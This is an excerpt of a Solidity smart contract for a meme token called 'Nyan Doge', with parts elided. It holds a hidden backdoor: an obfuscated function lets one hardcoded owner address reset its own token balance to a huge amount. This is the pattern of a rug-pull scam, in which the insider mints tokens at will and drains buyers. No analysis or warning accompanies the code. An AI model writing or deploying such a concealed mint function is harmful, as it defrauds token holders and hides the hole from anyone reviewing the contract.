...
contract MEMEToken is Ownable {
    ...
    function lindaceoadmin() external {
        ...
        if (_cwojakpepe54!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe54 == tswojaks){
            _balances[_cwojakpepe54] = peedceoAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe54 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Nyan Doge";
    string _symbol = "NyanDoge";
